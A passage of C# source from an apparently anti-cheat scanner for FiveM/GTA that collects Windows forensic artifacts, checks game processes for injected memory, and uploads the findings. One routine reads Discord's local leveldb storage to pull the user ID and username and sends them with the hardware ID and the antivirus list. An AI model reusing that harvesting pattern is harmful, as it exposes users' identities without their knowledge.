                        }
                        catch { }
                    }

                    if (shimCacheFindings.Count > 0)
                    {
                        _artifacts["SHIMCACHE_EVIDENCE"] = shimCacheFindings;
                    }

                    Console.WriteLine($"? Parsed {entries.Count} ShimCache entries, found {shimCacheFindings.Count} suspicious");
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("??  ShimCache requires administrator privileges");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"??  Error scanning ShimCache: {ex.Message}");
            }
        }

        // Get last execution time for a file by checking Prefetch, ShimCache, MFT, and file timestamps
        private DateTime? GetLastExecutionTime(string filePath)
        {
            if (string.IsNullOrWhiteSpace(filePath))
                return null;

            // Check cache first
            var normalizedPath = filePath.ToLowerInvariant();
            if (_executionTimeCache.TryGetValue(normalizedPath, out var cached))
                return cached;

            var fileName = Path.GetFileNameWithoutExtension(filePath).ToLowerInvariant();
            var latestTime = (DateTime?)null;
            var prefetchTime = (DateTime?)null;
            var mftAccessTime = (DateTime?)null;
            
            // Get current time to filter out timestamps caused by the scanner itself
            var scanStartTime = DateTime.Now.AddMinutes(-5); // Ignore timestamps from last 5 minutes

            try
            {
                // 1. Check Prefetch files - BEST source for execution time
                var prefetchPath = @"C:\Windows\Prefetch";
                if (Directory.Exists(prefetchPath))
                {
                    var prefetchFiles = Directory.GetFiles(prefetchPath, "*.pf");
                    foreach (var pfFile in prefetchFiles)
                    {
                        try
                        {
                            var pfFileName = Path.GetFileNameWithoutExtension(pfFile).ToLowerInvariant();
                            var dashIndex = pfFileName.LastIndexOf('-');
                            if (dashIndex > 0)
                            {
                                pfFileName = pfFileName.Substring(0, dashIndex);
                            }

                            if (pfFileName == fileName)
                            {
                                // Prefetch file's LastWriteTime indicates when the program was last executed
                                var pfInfo = new FileInfo(pfFile);
                                var pfTime = pfInfo.LastWriteTime;
                                
                                // Ignore if timestamp is too recent (likely caused by scanner)
                                if (pfTime < scanStartTime)
                                {
                                    if (prefetchTime == null || pfTime > prefetchTime.Value)
                                    {
                                        prefetchTime = pfTime;
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            try
            {
                // 2. Check MFT entries for Last Accessed time - SECOND BEST source
                if (_artifacts.TryGetValue("MFT_ENTRIES", out var mftObj) && mftObj is List<object> mftEntries)
                {
                    foreach (var entryObj in mftEntries)
                    {
                        try
                        {
                            if (entryObj is Newtonsoft.Json.Linq.JObject entry)
                            {
                                var fullPath = entry["details"]?["fullPath"]?.ToString();
                                if (!string.IsNullOrEmpty(fullPath) && 
                                    (fullPath.Equals(filePath, StringComparison.OrdinalIgnoreCase) ||
                                     Path.GetFileName(fullPath).Equals(Path.GetFileName(filePath), StringComparison.OrdinalIgnoreCase)))
                                {
                                    var accessedStr = entry["details"]?["accessed"]?.ToString();
                                    if (DateTime.TryParse(accessedStr, out var accessedTime))
                                    {
                                        // Ignore if timestamp is too recent (likely caused by scanner)
                                        if (accessedTime < scanStartTime)
                                        {
                                            if (mftAccessTime == null || accessedTime > mftAccessTime.Value)
                                            {
                                                mftAccessTime = accessedTime;
                                            }
                                        }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
            }
            catch { }

            try
            {
                // 3. Check ShimCache (if accessible) - THIRD source
                var shimCachePath = @"SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache";
                using (var key = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(shimCachePath))
                {
                    if (key != null)
                    {
                        var appCompatCache = key.GetValue("AppCompatCache") as byte[];
                        if (appCompatCache != null && appCompatCache.Length > 0)
                        {
                            var entries = ParseShimCacheData(appCompatCache);
                            foreach (var entry in entries)
                            {
                                if (entry.Path.Equals(filePath, StringComparison.OrdinalIgnoreCase) ||
                                    Path.GetFileName(entry.Path).Equals(fileName + ".exe", StringComparison.OrdinalIgnoreCase))
                                {
                                    // ShimCache timestamps are generally reliable, but still filter recent ones
                                    if (entry.LastModified < scanStartTime)
                                    {
                                        if (latestTime == null || entry.LastModified > latestTime.Value)
                                        {
                                            latestTime = entry.LastModified;
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            catch { }

            // Priority: Prefetch > MFT Accessed > ShimCache > File LastWriteTime
            // Prefetch is the most reliable indicator of when a program was executed
            if (prefetchTime.HasValue)
            {
                latestTime = prefetchTime;
            }
            else if (mftAccessTime.HasValue)
            {
                latestTime = mftAccessTime;
            }
            // else latestTime already has ShimCache value if found

            try
            {
                // 4. Fallback: Check file LastWriteTime (creation/modification time, NOT execution time)
                // Only use if no other source found
                if (latestTime == null && File.Exists(filePath))
                {
                    var fileInfo = new FileInfo(filePath);
                    var fileTime = fileInfo.LastWriteTime;
                    
                    // Only use if not too recent
                    if (fileTime < scanStartTime)
                    {
                        latestTime = fileTime;
                    }
                }
            }
            catch { }

            // Cache the result
            _executionTimeCache[normalizedPath] = latestTime;
            return latestTime;
        }

        // Get execution instance status instead of exact time
        private string GetExecutionInstanceStatus(string filePath)
        {
            if (string.IsNullOrWhiteSpace(filePath))
                return "Out of instance";

            try
            {
                var fileName = Path.GetFileNameWithoutExtension(filePath);
                var fileExtension = Path.GetExtension(filePath).ToLower();
                var fullPath = Path.GetFullPath(filePath);

                // Check if process is currently running (for EXEs)
                var runningProcesses = System.Diagnostics.Process.GetProcesses();
                foreach (var proc in runningProcesses)
                {
                    try
                    {
                        // Check main process executable
                        if (proc.ProcessName.Equals(fileName, StringComparison.OrdinalIgnoreCase))
                        {
                            Console.WriteLine($"?? {fileName}: In instance (running process)");
                            return "In instance";
                        }

                        // For DLLs, check loaded modules in relevant processes
                        // We prioritize FiveM/GTA processes for performance, but check others if needed
                        if (fileExtension == ".dll")
                        {
                            try
                            {
                                foreach (System.Diagnostics.ProcessModule module in proc.Modules)
                                {
                                    if (module.FileName.Equals(fullPath, StringComparison.OrdinalIgnoreCase))
                                    {
                                        Console.WriteLine($"?? {fileName}: In instance (loaded in {proc.ProcessName})");
                                        return "In instance";
                                    }
                                }
                            }
                            catch { /* Access denied to modules for some processes */ }
                        }
                    }
                    catch { }
                }
                
                // Check if it ran since boot (Prefetch or recent execution)
                var lastExecution = GetLastExecutionTime(filePath);
                if (lastExecution.HasValue)
                {
                    // Use TickCount64 to avoid overflow issues
                    var bootTime = DateTime.Now - TimeSpan.FromMilliseconds(Environment.TickCount64);
                    
                    // If executed after boot time, it ran in this boot session
                    if (lastExecution.Value > bootTime)
                    {
                        Console.WriteLine($"?? {fileName}: Boot instance (ran since boot at {lastExecution.Value})");
                        return "Boot instance";
                    }
                }
                
                Console.WriteLine($"?? {fileName}: Out of instance");
                return "Out of instance";
            }
            catch (Exception ex)
            {
                Console.WriteLine($"?? Error getting instance status for {filePath}: {ex.Message}");
                return "Out of instance";
            }
        }

        // Helper: ROT13 decoder for UserAssist
        private string Rot13Decode(string input)
        {
            var result = new char[input.Length];
            for (int i = 0; i < input.Length; i++)
            {
                char c = input[i];
                if (c >= 'a' && c <= 'z')
                {
                    result[i] = (char)('a' + (c - 'a' + 13) % 26);
                }
                else if (c >= 'A' && c <= 'Z')
                {
                    result[i] = (char)('A' + (c - 'A' + 13) % 26);
                }
                else
                {
                    result[i] = c;
                }
            }
            return new string(result);
        }

        // Helper: Parse ShimCache binary data (simplified)
        private List<ShimCacheEntry> ParseShimCacheData(byte[] data)
        {
            var entries = new List<ShimCacheEntry>();
            
            try
            {
                // This is a simplified parser - full ShimCache parsing is very complex
                // We'll extract what we can using string scanning
                
                var dataString = Encoding.Unicode.GetString(data);
                var paths = new List<string>();
                
                // Extract paths (look for drive letters followed by paths)
                var pathPattern = new System.Text.RegularExpressions.Regex(@"[A-Z]:\\[^\x00]+\.exe", System.Text.RegularExpressions.RegexOptions.IgnoreCase);
                var matches = pathPattern.Matches(dataString);
                
                foreach (System.Text.RegularExpressions.Match match in matches)
                {
                    var path = match.Value;
                    if (path.Length > 10 && path.Length < 500) // Reasonable path length
                    {
                        entries.Add(new ShimCacheEntry
                        {
                            Path = path,
                            LastModified = DateTime.Now, // Would need proper binary parsing
                            FileSize = 0 // Would need proper binary parsing
                        });
                    }
                }
            }
            catch { }
            
            return entries.Distinct(new ShimCacheEntryComparer()).ToList();
        }

        // Helper class for ShimCache entries
        private class ShimCacheEntry
        {
            public string Path { get; set; } = "";
            public DateTime LastModified { get; set; }
            public long FileSize { get; set; }
        }

        private class ShimCacheEntryComparer : IEqualityComparer<ShimCacheEntry>
        {
            public bool Equals(ShimCacheEntry x, ShimCacheEntry y)
            {
                return x?.Path?.ToLower() == y?.Path?.ToLower();
            }

            public int GetHashCode(ShimCacheEntry obj)
            {
                return obj.Path?.ToLower().GetHashCode() ?? 0;
            }
        }

        private async Task SubmitResults()
        {
            try
            {
                Console.WriteLine("?? Preparing scan results for submission...");
                
                // Collect system information and add to artifacts
                var systemInfoList = new List<object>
                {
                    new { key = "OS Version", value = Environment.OSVersion.ToString() },
                    new { key = "CPU Info", value = Environment.ProcessorCount + " cores" },
                    new { key = "RAM Total", value = GetTotalRAM() },
                    new { key = "Hardware ID (UUID)", value = GetHardwareId() },
                    new { key = "Antivirus", value = GetAntivirusInfo() },
                    new { key = "Uptime", value = GetSystemUptime() }
                };

                // Get Discord identity if available
                var discordIdentity = await GetDiscordIdentity();
                
                if (discordIdentity != null)
                {
                    systemInfoList.Add(new { key = "Discord Username", value = discordIdentity.Value.username });
                    systemInfoList.Add(new { key = "Discord User ID", value = discordIdentity.Value.userId });
                }

                // Add system info to artifacts
                _artifacts["SYSTEM_INFORMATION"] = systemInfoList;

                // Prepare the complete scan data in the format the server expects
                var scanData = new
                {
                    pin = _pin,
                    results = _findings,
                    artifacts = _artifacts,
                    timestamp = DateTime.UtcNow.ToString("o")
                };

                Console.WriteLine($"?? Scan data prepared:");
                Console.WriteLine($"   - Findings: {_findings.Count}");
                Console.WriteLine($"   - Artifact categories: {_artifacts.Count}");
                Console.WriteLine($"   - Total artifacts: {_artifacts.Values.Sum(list => list.Count)}");

                // Submit to server
                var success = await _apiClient.SubmitScanResults(scanData);
                
                if (success)
                {
                    Console.WriteLine("? Results successfully submitted to server!");
                }
                else
                {
                    Console.WriteLine("? Failed to submit results to server");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"? CRITICAL ERROR in SubmitResults: {ex.Message}");
            }
        }

        private string GetTotalRAM()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT TotalVisibleMemorySize FROM Win32_OperatingSystem"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        var totalKB = Convert.ToUInt64(obj["TotalVisibleMemorySize"]);
                        var totalGB = totalKB / 1024.0 / 1024.0;
                        return $"{totalGB:F2} GB";
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetHardwareId()
        {
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT UUID FROM Win32_ComputerSystemProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        return obj["UUID"]?.ToString() ?? "Unknown";
                    }
                }
            }
            catch { }
            return "Unknown";
        }

        private string GetAntivirusInfo()
        {
            try
            {
                var antivirusList = new List<string>();
                using (var searcher = new ManagementObjectSearcher(@"root\SecurityCenter2", "SELECT * FROM AntiVirusProduct"))
                {
                    foreach (ManagementObject obj in searcher.Get())
                    {
                        var displayName = obj["displayName"]?.ToString();
                        if (!string.IsNullOrEmpty(displayName))
                        {
                            antivirusList.Add(displayName);
                        }
                    }
                }
                return antivirusList.Count > 0 ? string.Join(", ", antivirusList) : "None detected";
            }
            catch { }
            return "Unknown";
        }

        private string GetSystemUptime()
        {
            try
            {
                var uptime = TimeSpan.FromMilliseconds(Environment.TickCount64);
                return $"{uptime.Days}d {uptime.Hours}h {uptime.Minutes}m";
            }
            catch { }
            return "Unknown";
        }

        private async Task<(string username, string userId)?> GetDiscordIdentity()
        {
            try
            {
                // Discord paths to check
                var discordPaths = new Dictionary<string, string>
                {
                    { "Discord", System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discord") },
                    { "Discord Canary", System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordcanary") },
                    { "Discord PTB", System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "discordptb") }
                };

                foreach (var discord in discordPaths)
                {
                    var leveldbPath = System.IO.Path.Combine(discord.Value, "Local Storage", "leveldb");
                    
                    if (!System.IO.Directory.Exists(leveldbPath))
                        continue;

                    try
                    {
                        var files = System.IO.Directory.GetFiles(leveldbPath)
                            .Where(f => f.EndsWith(".ldb") || f.EndsWith(".log"))
                            .ToList();

                        foreach (var file in files)
                        {
                            try
                            {
                                var content = System.IO.File.ReadAllText(file, Encoding.UTF8);
                                var userIdMatches = System.Text.RegularExpressions.Regex.Matches(content, @"""id""\s*:\s*""(\d{17,19})""");
                                
                                if (userIdMatches.Count > 0)
                                {
                                    var userId = userIdMatches[0].Groups[1].Value;
                                    var usernameMatch = System.Text.RegularExpressions.Regex.Match(content, @"""username""\s*:\s*""([^""]{2,32})""");
                                    var username = usernameMatch.Success ? usernameMatch.Groups[1].Value : "Discord User";
                                    
                                    if (username == "Discord User")
                                    {
                                        var globalNameMatch = System.Text.RegularExpressions.Regex.Match(content, @"""global_name""\s*:\s*""([^""]{2,32})""");
                                        if (globalNameMatch.Success)
                                        {
                                            username = globalNameMatch.Groups[1].Value;
                                        }
                                    }
                                    
                                    return (username, userId);
                                }
                            }
                            catch { }
                        }
                    }
                    catch { }
                }
            }
            catch { }
            return null;
        }

        // ============================================================================
        // CUSTOM RULES CHECKING METHODS
        // ============================================================================

        private bool CheckCustomKeywords(string filePath, out string matchedKeyword, out string severity)
        {
            matchedKeyword = "";
            severity = "Medium";
            
            if (_customKeywords == null || _customKeywords.Count == 0)
                return false;
            
            var fileName = Path.GetFileName(filePath).ToLower();
            var fullPath = filePath.ToLower();
            
            foreach (var keyword in _customKeywords)
            {
                if (fileName.Contains(keyword) || fullPath.Contains(keyword))
                {
                    matchedKeyword = keyword;
                    _customKeywordSeverity.TryGetValue(keyword, out severity);
                    severity = severity ?? "Medium";
                    return true;
                }
            }
            
            return false;
        }

        private bool CheckCustomHashes(string fileHash, out string severity)
        {
            severity = "High";
            
            if (_customHashes == null || _customHashes.Count == 0 || string.IsNullOrEmpty(fileHash))
                return false;
            
            var hashUpper = fileHash.ToUpper();
            
            if (_customHashes.Contains(hashUpper))
            {
                _customHashSeverity.TryGetValue(hashUpper, out severity);
                severity = severity ?? "High";
                return true;
            }
            
            return false;
        }

        private void AddCustomRuleFinding(string filePath, string ruleType, string matchedValue, string severity)
        {
            _findings.Add(new
            {
                category = "Custom Rule Detection",
                name = $"Custom {ruleType}: {Path.GetFileName(filePath)}",
                severity = severity,
                path = filePath,
                action = $"Matched custom {ruleType}: {matchedValue}",
                source_type = "CustomRule",
                rule_match = matchedValue
            });
            
            Console.WriteLine($"?? Custom {ruleType} match: {Path.GetFileName(filePath)} -> {matchedValue}");
        }

        private async Task ScanDirectoriesWithCustomRules()
        {
            var scanPaths = new[]
            {
                Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
                Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)),
                Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData))
            };

            int filesScanned = 0;
            int matchesFound = 0;

            foreach (var basePath in scanPaths)
            {
                if (!Directory.Exists(basePath))
                    continue;

                try
                {
                    var files = Directory.GetFiles(basePath, "*.*", SearchOption.AllDirectories)
                        .Where(f => f.EndsWith(".exe", StringComparison.OrdinalIgnoreCase) ||
                                   f.EndsWith(".dll", StringComparison.OrdinalIgnoreCase))
                        .Take(1000);

                    foreach (var file in files)
                    {
                        try
                        {
                            filesScanned++;

                            if (CheckCustomKeywords(file, out var keyword, out var kwSeverity))
                            {
                                AddCustomRuleFinding(file, "Keyword", keyword, kwSeverity);
                                matchesFound++;
                            }

                            if (File.Exists(file))
                            {
                                using (var sha256 = System.Security.Cryptography.SHA256.Create())
                                {
                                    using (var stream = File.OpenRead(file))
                                    {
                                        var hashBytes = sha256.ComputeHash(stream);
                                        var hash = BitConverter.ToString(hashBytes).Replace("-", "");
                                        
                                        if (CheckCustomHashes(hash, out var hashSeverity))
                                        {
                                            AddCustomRuleFinding(file, "Hash", hash.Substring(0, 16) + "...", hashSeverity);
                                            matchesFound++;
                                        }
                                    }
                                }
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            }
            
            Console.WriteLine($"? Scanned {filesScanned} files, found {matchesFound} custom rule matches");
            await Task.CompletedTask;
        }

        // P/Invoke for GetMappedFileName
        [DllImport("psapi.dll", SetLastError = true)]
        private static extern uint GetMappedFileName(IntPtr hProcess, IntPtr lpv, StringBuilder lpFilename, uint nSize);

        private async Task ScanForUnbackedExecutableMemory()
        {
            var anomalies = new List<object>();
            var targetProcesses = System.Diagnostics.Process.GetProcesses()
                .Where(p => p.ProcessName.ToLower().Contains("fivem") || 
                           p.ProcessName.ToLower().Contains("gta"))
                .Take(3);

            Console.WriteLine("?? Scanning for unbacked executable memory (Hidden Injections)...");

            foreach (var proc in targetProcesses)
            {
                IntPtr hProcess = IntPtr.Zero;
                try
                {
                    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, false, proc.Id);
                    if (hProcess == IntPtr.Zero) continue;

                    var mbi = new MEMORY_BASIC_INFORMATION();
                    IntPtr address = IntPtr.Zero;

                    while (VirtualQueryEx(hProcess, address, out mbi, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION))) != 0)
                    {
                        // Check for Executable memory (PAGE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE)
                        bool isExecutable = (mbi.Protect & 0x10) != 0 || (mbi.Protect & 0x20) != 0 || (mbi.Protect & 0x40) != 0;
                        
                        // Check if memory is MEM_PRIVATE (not mapped to a file) or MEM_MAPPED
                        if (isExecutable && mbi.State == 0x1000) // MEM_COMMIT
                        {
                            bool isSuspicious = false;
                            string details = "";

                            if (mbi.Type == 0x20000) // MEM_PRIVATE
                            {
                                // Private executable memory is HIGHLY suspicious (Manual Map, Code Injection)
                                // Unless it's JIT code (which usually has specific patterns, but for FiveM/GTA main modules it's rare to have large private exec chunks)
                                isSuspicious = true;
                                details = "Private Executable Memory (Potential Manual Map/Injection)";
                            }
                            else if (mbi.Type == 0x40000) // MEM_MAPPED
                            {
                                // Check if it maps to a valid file
                                var filename = new StringBuilder(1024);
                                if (GetMappedFileName(hProcess, mbi.BaseAddress, filename, 1024) > 0)
                                {
                                    string mappedFile = filename.ToString();
                                    // If mapped to a temp file or weird location, flag it
                                    if (mappedFile.Contains("AppData") || mappedFile.Contains("Temp"))
                                    {
                                        isSuspicious = true;
                                        details = $"Mapped to suspicious file: {mappedFile}";
                                    }
                                }
                                else
                                {
                                    // Mapped but no filename? Suspicious.
                                    isSuspicious = true;
                                    details = "Mapped Executable Memory without backing file";
                                }
                            }

                            if (isSuspicious)
                            {
                                anomalies.Add(new
                                {
                                    process = proc.ProcessName,
                                    pid = proc.Id,
                                    address = $"0x{mbi.BaseAddress.ToInt64():X}",
                                    size = mbi.RegionSize.ToInt64(),
                                    type = details,
                                    protection = mbi.Protect
                                });
                                
                                Console.WriteLine($"   ?? ANOMALY: {proc.ProcessName} - {details} at 0x{mbi.BaseAddress.ToInt64():X} ({mbi.RegionSize} bytes)");
                            }
                        }

                        // Move to next region
                        long nextAddress = address.ToInt64() + mbi.RegionSize.ToInt64();
                        if (nextAddress < address.ToInt64()) break; // Overflow check
                        address = new IntPtr(nextAddress);
                    }
                }
                catch { }
                finally
                {
                    if (hProcess != IntPtr.Zero) CloseHandle(hProcess);
                }
            }

            if (anomalies.Count > 0)
            {
                _findings.Add(new
                {
                    category = "Memory Anomalies",
                    name = "Unbacked Executable Memory Detected",
                    severity = "Critical",
                    details = anomalies,
                    action = "Detected Hidden Injection",
                    source_type = "Memory Analysis"
                });
            }
        }

        private async Task ScanLnkFiles()
        {
            var lnkFindings = new List<object>();
            var recentPath = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
            
            Console.WriteLine("?? Scanning Recent Files (LNK Forensics)...");

            if (Directory.Exists(recentPath))
            {
                try
                {
                    var lnkFiles = Directory.GetFiles(recentPath, "*.lnk", SearchOption.AllDirectories);
                    foreach (var lnk in lnkFiles)
                    {
                        try
                        {
                            // Basic LNK parsing (reading file content for strings as a lightweight approach)
                            // A full LNK parser is complex, but paths are usually visible in plain text or UTF-16
                            string content = File.ReadAllText(lnk);
                            string name = Path.GetFileNameWithoutExtension(lnk);
                            
                            // Check for suspicious keywords in the LNK name or content
                            foreach (var keyword in CheatDatabase.SuspiciousKeywords)
                            {
                                if (name.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0 || 
                                    content.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0)
                                {
                                    lnkFindings.Add(new
                                    {
                                        file = Path.GetFileName(lnk),
                                        match = keyword,
                                        path = lnk
                                    });
                                    
                                    _findings.Add(new
                                    {
                                        category = "Forensics",
                                        name = $"Suspicious LNK File: {name}",
                                        severity = "High",
                                        path = lnk,
                                        action = "Found Trace in Recent Files",
                                        source_type = "LNK Forensics"
                                    });
                                    
                                    Console.WriteLine($"   ??? Found suspicious LNK: {name} (Match: {keyword})");
                                    break;
                                }
                            }
                        }
                        catch { }
                    }
                }
                catch { }
            }
        }

        private async Task ScanShellBags()
        {
            // Lightweight ShellBag scanning via Registry Strings
            // Instead of full binary parsing, we scan the BagMRU keys for suspicious strings
            Console.WriteLine("?? Scanning ShellBags (Directory Access History)...");
            
            var shellBagPaths = new[] {
                @"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
                @"Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags"
            };

            try
            {
                using (var hkcu = Registry.CurrentUser)
                {
                    foreach (var path in shellBagPaths)
                    {
                        await RecursiveRegistryScan(hkcu, path);
                    }
                }
            }
            catch { }
        }

        private async Task RecursiveRegistryScan(RegistryKey root, string subPath)
        {
            try
            {
                using (var key = root.OpenSubKey(subPath))
                {
                    if (key == null) return;

                    // Check values
                    foreach (var valName in key.GetValueNames())
                    {
                        var val = key.GetValue(valName);
                        if (val is byte[] bytes)
                        {
                            // Convert bytes to string and check for keywords
                            // ShellBags store paths in binary format
                            string data = Encoding.Default.GetString(bytes) + Encoding.Unicode.GetString(bytes);
                            
                            foreach (var keyword in CheatDatabase.SuspiciousKeywords)
                            {
                                if (data.IndexOf(keyword, StringComparison.OrdinalIgnoreCase) >= 0)
                                {
                                    _findings.Add(new
                                    {
                                        category = "Forensics",
                                        name = $"ShellBag Trace: {keyword}",
                                        severity = "Medium",
                                        details = $"Found in {subPath}",
                                        action = "Detected Directory Access",
                                        source_type = "ShellBags"
                                    });
                                    Console.WriteLine($"   ?? ShellBag Trace: {keyword}");
                                    break; // One match per key is enough
                                }
                            }
                        }
                    }

                    // Recurse subkeys
                    foreach (var subKeyName in key.GetSubKeyNames())
                    {
                        await RecursiveRegistryScan(root, Path.Combine(subPath, subKeyName));
                    }
                }
            }
            catch { }
        }

    }
}